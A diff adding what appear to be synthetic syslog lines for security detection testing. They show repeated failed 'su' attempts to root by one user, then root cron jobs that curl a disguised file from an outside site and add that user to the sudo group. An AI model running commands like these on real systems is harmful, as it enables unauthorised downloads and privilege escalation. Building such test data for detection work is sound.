@@ -1,0 +1,13 @@
+<85>1 2022-11-22T14:09:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:10:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:11:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:12:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:13:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:14:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:15:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:16:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:17:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:18:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<85>1 2022-11-22T14:19:33.906624+00:00 prod-linux su - - -  pam_unix(su:auth): authentication failure; logname=serhatg uid=1001 euid=0 tty=pts/0 ruser=serhatg rhost=  user=root
+<78>1 2022-11-22T14:20:33.906624+00:00 prod-linux CRON[28525]: (root) CMD (/usr/bin/curl -L https://www.manygoodnews.com/download?item=mycatpicture.png)
+<78>1 2022-11-22T14:21:33.906624+00:00 prod-linux CRON[29471]: (root) CMD (/usr/bin/sudo usermod -aG sudo serhatg)
